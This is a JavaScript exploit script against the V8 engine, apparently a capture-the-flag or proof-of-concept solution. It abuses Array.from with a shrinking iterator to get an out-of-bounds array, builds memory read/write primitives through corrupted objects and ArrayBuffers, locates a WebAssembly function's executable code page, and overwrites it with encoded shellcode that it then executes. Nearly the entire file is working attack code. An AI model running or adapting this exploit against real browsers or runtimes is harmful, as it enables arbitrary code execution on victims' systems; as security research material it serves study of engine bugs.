function sleep(d){
  for(var t = Date.now();Date.now() - t <= d;);
}
function gc()
{
	/*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/
    for(var i=0;i<((1024 * 1024)/0x10);i++)
	{
        var a= new String();
    }
}
function give_me_a_clean_newspace()
{
	/*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/
	gc()
	gc()
}
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
    f64[0] = v;
    return u32;
}
function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64;
}
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}
// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));
    return res.join('');
}
// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");
    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
    return bytes;
}
function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);
    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }
    return lines.join('\n');
}
// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);
    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },
        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");
            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },
        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();
//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;
            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }
    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");
        return Struct.unpack(Struct.float64, bytes);
    };
    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");
        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);
        return res;
    };
    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };
    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };
    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };
    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.
    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }
    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);
        return this.assignAdd(this, Int64.One);
    }, 1);
    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}
// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};
// Convenience functions. These allocate a new Int64 to hold the result.
// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}
// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}
// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}
// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
function utf8ToString(h, p) {
  let s = "";
  for (i = p; h[i]; i++) {
    s += String.fromCharCode(h[i]);
  }
  return s;
}
function log(x,y = ' '){
    console.log("[+] log:", x,y);   
}

function bk(){
    readline();
}
function exit(){
     throw new TypeError("Invalid Found");
}

var objs=new Array();
var bufs=new Array();
var count_max = 16*1024;


var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
  var wasmImports = {
    env: {
      puts: function puts (index) {
        console.log(utf8ToString(h, index));
      }
    }
  };
let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
let h = new Uint8Array(m.exports.memory.buffer);
let f = m.exports.p4nda;
f();
give_me_a_clean_newspace();
console.log("[+] Game Start ");
let oob = [1.1];

Array.from.call(function() { return oob }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : count_max,
    next() {
      this.counter++;
      let result = this.counter;
      if (this.counter == this.max) {
        oob.length = 1;
        return {done: true};
      } else {
        objs.push({marker: 0x41414141, obj: {}});
        bufs.push( new ArrayBuffer(0x1234));
        return {value: result, done: false};
      }
    }
  }
) });    
log("after change");
//dp(oob);
give_me_a_clean_newspace();
let victim_obj = null;
let victim_obj_idx_obj = null;
for (let i = 0; i < count_max; i++) {
    let tmp =Int64.fromDouble(oob[i]).toString();
    //log(tmp);
    if(tmp == "0x4141414100000000"){
        log("found victim obj index",i+1);
        oob[i] = (new Int64("4242424200000000")).asDouble();
        victim_obj_idx_obj = i+1;
        break;
     }
}    
//dp(oob);
give_me_a_clean_newspace();    
for (let i =0 ;i<objs.length;i++){
    if(objs[i].marker == 0x42424242){
        log("found victim obj");
        victim_obj = objs[i];
        //dp(victim_obj);
        break;
    }
}
if (victim_obj ==null){
    log("wrong");
    exit();
}    
let victim_buf = null;
let victim_buf_idx_ptr = null;    
for (let i = 0; i < count_max; i++) {
    let tmp = Int64.fromDouble(oob[i]);
    //log(tmp);
    if (tmp == 0x123400000000) {
        //oob[i] = (new Int64("7fffffff")).asDouble();
        oob[i] = (new Int64(0x486900000000)).asDouble();
        oob[i + 3] = (new Int64(0x4869)).asDouble();        
        log("found victim buf index",i+1);
        victim_buf_idx_ptr = i + 1;
        break;
    }
}
if (victim_buf_idx_ptr ==null){
    log("wrong");
   exit();
}
for (let i = 0;i < bufs.length;i++){
    //log(bufs[i].byteLength );
    if(bufs[i].byteLength !=0x1234){
        log("found victim buf");
        victim_buf = bufs[i];

        break;
    }
}
if (victim_buf ==null){
    log("wrong");
   exit();
}  
//dp(victim_buf);

victim_obj.obj = f;
//dp(victim_obj);
log(victim_obj_idx_obj);
console.log("[+] JSfunction addr:",Int64.fromDouble(oob[victim_obj_idx_obj]).toString());
//dp(f);

oob[victim_buf_idx_ptr] = oob[victim_obj_idx_obj];
let dv = new DataView(victim_buf);
log(victim_buf.byteLength );
oob[victim_buf_idx_ptr] = oob[victim_obj_idx_obj];
console.log("[+] Set victim buf addr:",Int64.fromDouble(oob[victim_buf_idx_ptr]).toString());

SharedFunctionInfo_addr = Int64.fromDouble(dv.getFloat64(0x17,true));
console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr);
oob[victim_buf_idx_ptr] = SharedFunctionInfo_addr.asDouble();
console.log("[+] Set victim buf addr:",Int64.fromDouble(oob[victim_buf_idx_ptr]).toString());

WasmExportedFunctionData_addr =  Int64.fromDouble(dv.getFloat64(0x7,true));
console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr);   
oob[victim_buf_idx_ptr] = WasmExportedFunctionData_addr.asDouble();
console.log("[+] Set victim buf addr:",Int64.fromDouble(oob[victim_buf_idx_ptr]).toString());

code_addr   =  Int64.fromDouble(dv.getFloat64(0x67+8+2,true));
console.log("[+] code addr :"+code_addr  );   
oob[victim_buf_idx_ptr] = code_addr .asDouble();
console.log("[+] Set victim buf addr:",Int64.fromDouble(oob[victim_buf_idx_ptr]).toString());

let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
let write_tmp = new Uint8Array(victim_buf);
write_tmp.set(shellcode_calc);
log("Press Any key to execute Shellcode");
bk();
f();
